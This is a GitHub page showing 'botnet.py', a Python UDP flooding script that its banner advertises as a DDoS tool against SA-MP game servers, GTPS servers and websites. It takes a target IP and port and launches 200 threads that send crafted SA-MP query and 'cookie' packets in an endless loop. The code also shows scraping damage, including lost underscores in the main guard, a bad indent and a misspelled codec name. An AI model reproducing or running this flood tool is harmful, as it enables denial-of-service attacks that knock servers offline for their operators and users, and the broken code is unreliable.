Skip to content
Cacanxgz
/
botnetnih
Code
Issues
Pull requests
Actions
Projects
Wiki
Security
Insights
botnetnih/botnet.py
@Cacanxgz
Cacanxgz Add files via upload
 1 contributor
71 lines (55 sloc)  2.52 KB
##Remake By Jemboetoes
##UDP FLOODING FOD SAMP | GTPS | WEBSITE
import socket
import struct
import codecs,sys
import threading
import random
import time
import os



ip = sys.argv[1]
port = sys.argv[2]
orgip =ip

Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hexcodec")#cookie port 7784 tambem
                       ]


os.system("clear")
print("\033[31mMenyerang Ke IP %s|%s"%(orgip,port))
 print('''
    /___/\    
   /  o   o  \ 
  ( ==  ^  == )   JEMBOETOES
   )         (    YouTube : JEMBOETOES 2070
  (           )   ========================================================
 ( (  )   (  ) )     DDOS FOR SAMP, ULTRA - HOST, 20GTPS
(()()) ===== Version: 1.0.0''')



class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)

                msg = Pacotes[random.randrange(0,5)]

                sock.sendto(msg, (ip, int(port)))


                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))



if name == 'main':
    try:
     for x in range(200):
            mythread = MyThread()
            mythread.start()
            time.sleep(.1)
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')